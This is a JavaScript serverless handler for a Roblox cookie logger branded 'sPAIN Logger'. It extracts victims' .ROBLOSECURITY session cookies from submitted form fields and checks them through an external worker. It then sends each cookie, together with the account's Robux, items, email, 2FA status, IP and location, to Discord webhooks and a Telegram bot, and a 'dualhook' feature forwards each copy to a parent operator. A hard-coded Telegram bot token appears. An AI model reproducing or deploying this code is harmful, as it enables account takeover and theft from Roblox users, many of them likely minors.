// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const CHECKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
const DISCORD_INV = 'https://discord.gg/5Q8XvgTpTT';
const BASE_URL    = 'https://spain-tools.vercel.app';

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
const EMOJI     = '<a:emoji_17:1508694920972468347>';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

// ── Geo ───────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
  } catch { return null; }
}

// ── Checker (holy-truth worker) ───────────────────────────────────────────────
async function getAccInfo(cookie) {
  try {
    const r = await fetch(CHECKER_URL, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ cookie })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return (d.valid || d.success) ? d : null;
  } catch { return null; }
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true })
    });
  } catch (_) {}
}

// ── Cookie extraction ─────────────────────────────────────────────────────────
const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

const FLAGS = {
  'United States':'🇺🇸','United Kingdom':'🇬🇧','Canada':'🇨🇦','Australia':'🇦🇺',
  'Germany':'🇩🇪','France':'🇫🇷','Netherlands':'🇳🇱','Philippines':'🇵🇭',
  'Indonesia':'🇮🇩','Singapore':'🇸🇬','Malaysia':'🇲🇾','India':'🇮🇳',
  'Japan':'🇯🇵','South Korea':'🇰🇷','Brazil':'🇧🇷','Mexico':'🇲🇽',
  'New Zealand':'🇳🇿','Ireland':'🇮🇪','Sweden':'🇸🇪','Norway':'🇳🇴',
  'Denmark':'🇩🇰','Finland':'🇫🇮','Poland':'🇵🇱','Spain':'🇪🇸',
  'Italy':'🇮🇹','Russia':'🇷🇺','Turkey':'🇹🇷','South Africa':'🇿🇦',
  'Thailand':'🇹🇭','Vietnam':'🇻🇳','Saudi Arabia':'🇸🇦','UAE':'🇦🇪'
};
function flag(c) { return FLAGS[c] || '🌐'; }

// ── Discord helpers ───────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    const webhookPayload = { 
      username: WH_NAME, 
      avatar_url: WH_AVATAR, 
      ...payload 
    };
    
    await fetch(url, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(webhookPayload)
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots, confirmOnly, deviceSelection, device } = body;
  
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  // ── SKIP intermediate steps (Yes confirmation & device selection) ──────────
  if (confirmOnly || deviceSelection) {
    // Just return success without sending any notifications
    return res.status(200).json({ success: true, step: confirmOnly ? 'confirm' : 'device', device });
  }

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const now    = new Date().toISOString();
  const pName  = record.displayName || slug;
  const isDH   = !!record.dualhookParent;
  const cookie = findCookie(slots);

  // Build webhook list
  let webhook1 = null;
  const webhook2 = record.webhook;
  let dhParentName = null;
  
  if (isDH) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook) {
        webhook1 = parent.webhook;
        dhParentName = parent.displayName || record.dualhookParent;
      }
    } catch (_) {}
  }

  // ── No cookie ────────────────────────────────────────────────────────────────
  if (!cookie) {
    const geo = await getIpGeo(ip);
    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
    
    // Base embed fields
    const baseFields = [
      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
      { name: '📄 Page', value: `\`${pName}\``, inline: true },
      { name: '📍 Location', value: loc, inline: false },
      { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true },
      { name: '🕐 Time', value: now, inline: true }
    ];
    
    // Send to webhook2 (original page) with sPAIN branding
    await discordSend(webhook2, {
      content: '@everyone',
      embeds: [{
        title: '🍪 Cookie Captured',
        description: `${EMOJI} ${pName} ${EMOJI}`,
        color: 0xff3333,
        fields: baseFields,
        footer: { text: `sPAIN Logger • ${pName}` },
        timestamp: now
      }]
    });
    
    // Send to webhook1 (dualhook parent) with sPAIN branding
    if (webhook1) {
      const dhFields = [...baseFields];
      dhFields.splice(2, 0, { name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true });
      
      await discordSend(webhook1, {
        content: '@everyone',
        embeds: [{
          title: '🍪 Cookie Captured (Dualhook)',
          description: `${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`,
          color: 0xff3333,
          fields: dhFields,
          footer: { text: `sPAIN Logger • ${pName}` },
          timestamp: now
        }]
      });
    }
    
    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // ── Cookie found — geo + checker run in parallel ──────────────────────────
  const [geo, info] = await Promise.all([
    getIpGeo(ip),
    getAccInfo(cookie)
  ]);

  const loc     = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const isp     = geo?.isp || 'Unknown';
  const country = geo?.country || 'Unknown';
  const cflag   = flag(country);
  const nowStr  = now;

  // ── Worker failed or invalid cookie ───────────────────────────────────────────
  if (!info) {
    // Base embed fields
    const baseFields = [
      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
      { name: '📄 Page', value: `\`${pName}\``, inline: true },
      { name: '💀 Status', value: 'Invalid/Expired Cookie', inline: true },
      { name: '📍 Location', value: loc, inline: false },
      { name: '🕐 Time', value: now, inline: true }
    ];
    
    // Send to webhook2 (original page) with sPAIN branding
    await discordSend(webhook2, {
      content: '@everyone',
      embeds: [{
        title: '🍪 Cookie Captured',
        description: `${EMOJI} ${pName} ${EMOJI}`,
        color: 0xff3333,
        fields: baseFields,
        footer: { text: `sPAIN Logger • ${pName}` },
        timestamp: now
      }]
    });
    
    // Send to webhook1 (dualhook parent) with sPAIN branding
    if (webhook1) {
      const dhFields = [...baseFields];
      dhFields.splice(2, 0, { name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true });
      
      await discordSend(webhook1, {
        content: '@everyone',
        embeds: [{
          title: '🍪 Cookie Captured (Dualhook)',
          description: `${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`,
          color: 0xff3333,
          fields: dhFields,
          footer: { text: `sPAIN Logger • ${pName}` },
          timestamp: now
        }]
      });
    }
    
    await tgSend(`⚠️ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // ── Pull all fields from checker response ─────────────────────────────────
  const fa           = info?.fullAccount || info || {};
  const username     = info?.username    || 'Unknown';
  const displayName  = info?.displayName || username;
  const uid          = info?.id          || info?.userId || '';
  const avatarUrl    = fa.avatarUrl      || info?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
  const ageDays      = fa.ageDays        ?? info?.ageDays      ?? 0;
  const robux        = fa.robux          ?? info?.robux        ?? 0;
  const rap          = fa.rap            ?? info?.rap          ?? 0;
  const limiteds     = fa.limiteds       ?? info?.limitedsCount ?? 0;
  const credit       = fa.credit         ?? info?.credit       ?? 0;
  const creditCurr   = fa.creditCurrency ?? info?.creditCurr   ?? 'USD';
  const friends      = fa.friends        ?? info?.friends      ?? 0;
  const emailDisplay = fa.emailDisplay   ?? info?.emailDisplay ?? 'Not Set';
  const emailVerified = fa.emailVerified ?? info?.emailVerified ?? false;
  const has2FA       = fa.has2FA         ?? info?.has2FA       ?? false;
  const tfaStatus    = fa.tfaStatus      ?? info?.tfaMethods   ?? 'Disabled';
  const voiceChatStatus = fa.voiceChatStatus ?? (fa.voiceChat ? '✓ Enabled' : '✗ Disabled');
  const premiumStatus = fa.premiumStatus   ?? (fa.isPremium ? '✓ Yes' : '✗ None');
  const headlessStatus = fa.headless ? '✓ Yes' : '✗ None';
  const korbloxStatus  = fa.korblox  ? '✓ Yes' : '✗ None';
  const valkyrieStatus = fa.valkyrie ? '✓ Yes' : '✗ None';
  const developerStatus = fa.developerStatus ?? (fa.gamesDeveloper ? '✓ Yes' : '✗ None');
  const groupsOwned  = fa.groupsOwned ?? 0;

  // Cookie display — trimmed for embed, full via chunked message
  const cookieDisplay = cookie.length > 950 ? cookie.substring(0, 950) + '…' : cookie;

  // ── Build the rich embed with NEW FORMAT ─────────────────────────────────
  const buildEmbed = (isDualhook) => ({
    title: isDualhook ? '🍪 Cookie Captured (Dualhook)' : '🍪 Cookie Captured',
    description: `${EMOJI} ${isDualhook ? 's.PAIN' : pName} ${EMOJI}\n\n[Profile 👤](https://www.roblox.com/users/${uid}/profile) | [Discord Server](${DISCORD_INV})`,
    color: 5793266,
    thumbnail: { url: avatarUrl },
    fields: [
      // ── Stats Row ─────────────────────────────────────────────────
      {
        name: '💰 Robux',
        value: `\`${fmt(robux)}\``,
        inline: true
      },
      {
        name: '🎵 RAP',
        value: `\`${fmt(rap)}\``,
        inline: true
      },
      {
        name: '📦 Items',
        value: `\`${limiteds}\``,
        inline: true
      },
      {
        name: '💳 Credit',
        value: `\`$${fmt(credit)} ${creditCurr}\``,
        inline: true
      },
      {
        name: '🗓️ Age',
        value: `\`${fmt(ageDays)} days\``,
        inline: true
      },
      {
        name: '👥 Friends',
        value: `\`${friends}\``,
        inline: true
      },
      
      // ── Security Section ──────────────────────────────────────────
      {
        name: '// Security',
        value: [
          `Premium: ${premiumStatus}`,
          `Email: ${emailDisplay}${emailVerified ? ' — Verified' : ''}`,
          `2FA: ${has2FA ? tfaStatus : 'Disabled'}`,
          `Voice Chat: ${voiceChatStatus}`
        ].join('\n'),
        inline: false
      },
      
      // ── Items Section ─────────────────────────────────────────────
      {
        name: '// Items',
        value: [
          `Headless: ${headlessStatus}`,
          `Korblox: ${korbloxStatus}`,
          `Valkyrie: ${valkyrieStatus}`,
          `Developer: ${developerStatus}`,
          `Groups Owned: ${groupsOwned}`
        ].join('\n'),
        inline: false
      },
      
      // ── Location (if dualhook show parent) ────────────────────────
      ...(isDualhook ? [{
        name: '🔒 DH Parent',
        value: `\`${dhParentName || 'Unknown'}\``,
        inline: false
      }] : []),
      
      {
        name: '🌐 IP',
        value: `\`${ip}\``,
        inline: true
      },
      {
        name: '📍 Location',
        value: `${country} ${cflag}`,
        inline: true
      },
      {
        name: '🗺️ ISP',
        value: isp,
        inline: true
      },
      
      // ── Cookie ────────────────────────────────────────────────────
      {
        name: '🔐 ROBLOSECURITY',
        value: `\`\`\`${cookieDisplay}\`\`\``,
        inline: false
      }
    ],
    footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
    timestamp: nowStr
  });

  // ── Send to webhook2 (page name) ──────────────────────────────────────────
  await discordSend(webhook2, { content: '@everyone', embeds: [buildEmbed(false)] });
  await discordChunked(webhook2, cookie);

  // ── Send to webhook1 (sPAIN) if exists ────────────────────────────────────
  if (webhook1) {
    await discordSend(webhook1, { content: '@everyone', embeds: [buildEmbed(true)] });
    await discordChunked(webhook1, cookie);
  }

  // ── Telegram ─────────────────────────────────────────────────────────────
  await tgSend([
    `✅ <b>${username} — ${pName}</b>`,
    `💰 ${fmt(robux)} R$ | RAP: ${fmt(rap)} | Items: ${limiteds}`,
    `📧 ${emailDisplay}`,
    `🔒 2FA: ${has2FA ? 'Yes' : 'No'} | VC: ${fa.voiceChat ? 'Yes' : 'No'}`,
    `📍 ${loc} | ${isp}`,
    `🔗 <a href="https://www.roblox.com/users/${uid}/profile">View Profile</a>`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
